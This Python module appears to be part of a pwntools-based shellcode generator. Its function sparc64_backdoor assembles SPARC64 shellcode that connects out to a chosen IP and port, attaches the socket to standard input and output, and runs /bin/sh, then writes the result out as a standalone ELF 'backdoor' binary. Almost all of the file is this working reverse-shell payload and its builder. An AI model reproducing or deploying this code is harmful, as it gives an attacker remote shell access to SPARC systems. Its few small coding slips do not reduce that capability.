from pwn import *
'''
11.17 add sparc32 ,powerpc don't exam
socket 0xce
connect 0x62
dup2  0x5A
execve  0x3B

add 11.24 sparc64_big_backdoor
'''
from colorama import Fore,Back,Style
from . import extract_shellcode

def sparc64_backdoor(reverse_ip ,reverse_port, filename = None):
    context.arch = 'sparc64'
    context.endian = 'big'
    context.bits = '64'
    log.success("reverse_ip is: "+ reverse_ip)
    log.success("reverse_port is: "+str(reverse_port))
    reverse_ip = reverse_ip.split('.')
    reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
    reverse_ip_2 = "0x"+enhex(p8(int(reverse_ip[1])))
    reverse_ip_3 = "0x"+enhex(p8(int(reverse_ip[2])))
    reverse_ip_4 = "0x"+enhex(p8(int(reverse_ip[3])))
    handle_port = hex(p16(reverse_port)[0])
    handle_port_1 = hex(p16(reverse_port)[1])
    shellcode = '''
    mov  0, %o2
    mov  1, %o1
    mov  2, %o0
    save   %sp,  -208,  %sp
    stx    %g1,  [ %fp + 0x7f7 ]
    clr    %g1
    mov    1,  %o0
    stx    %i0,  [ %fp + 0x7df ]
    stx    %i1,  [ %fp + 0x7e7 ]
    stx    %i2,  [ %fp + 0x7ef ]
    add    %fp,  0x7df,  %o1
    mov  0xce, %g1
    ta   0x10
    mov  %o0, %l0
    mov  {} , %g1 
    stb   %g1 , [%sp + 4 ]
    mov  {},  %g1
    stb   %g1 , [%sp + 5 ]
    mov  {},  %g1
    stb   %g1 , [%sp + 6 ]
    mov  {},  %g1
    stb   %g1 , [%sp + 7 ]
    mov  0 ,  %g1
    stb  %g1,   [%sp]
    mov  2,   %g1
    stb  %g1,   [%sp+1]
    mov   {}, %g1
    stb   %g1,  [%sp + 2]
    mov   {}, %g1
    stb   %g1,  [%sp + 3]
    mov  %sp, %o1
    mov  0x10,%o2
    mov  0x62,%g1
    ta   0x10
    mov  %l0, %o0
    mov  0,  %o1
    mov  0x5a, %g1
    ta   0x10
    mov  %l0, %o0
    mov  1,  %o1
    mov  0x5a, %g1
    ta   0x10
    mov  %l0, %o0
    mov  2,  %o2
    mov  0x5a, %g1
    ta   0x10
    sethi  0xbd89a, %g2
    or     %g2, 0x16e, %g2
    sethi  %hi(0x2f736800), %g3
    st     %g2, [%sp + 0x20]
    st   %g3, [%sp + 0x24]
    mov  0,  %g3
    add  %sp, 0x20, %g1
    mov  %g1, %o0
    stx   %g1, [%sp]
    stx   %g3, [%sp +8]
    mov  %sp, %o1
    mov  %g3, %o2
    mov  0x3b, %g1
    ta   0x10
    '''
    shellcode = asm(shellcode.format(reverse_ip_1, reverse_ip_2, reverse_ip_3, reverse_ip_4, handle_port, handle_port_1))
    ELF_data = make_elf(shellcode)
    if(filename==None):
        log.info("waiting 3s")
        sleep(1)
        f=open("./sparc64_backdoor","wb")
        f.write(ELF_data)
        f.close()
        log.success("sparc64_backdoor is ok in current path ./")
        context.arch = 'i386'
        context.bits = "32"
        context.endian = "little"
    else:
        if(os.path.exists(filename) != True):
            log.info("waiting 3s")
            sleep(1)
            f=open(filename,"wb")
            f.write(ELF_data)
            f.close()
            log.success("{} generated successfully".format(filename))
            context.arch='i386'
            context.bits="32"
            context.endian="little"
        else:
            print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
            choise = input()
            if choise == "y\n" or choise == "\n":
                log.info("waiting 3s")
                sleep(1)
                f=open(filename,"wb")
                f.write(ELF_data)
                f.close()
                log.success("{} generated successfully".format(filename))
                context.arch='i386'
                context.bits="32"
                context.endian="little"
            else:
                return  


def sparc64_reverse_sl(reverse_ip, reverse_port, filename = None):
    pass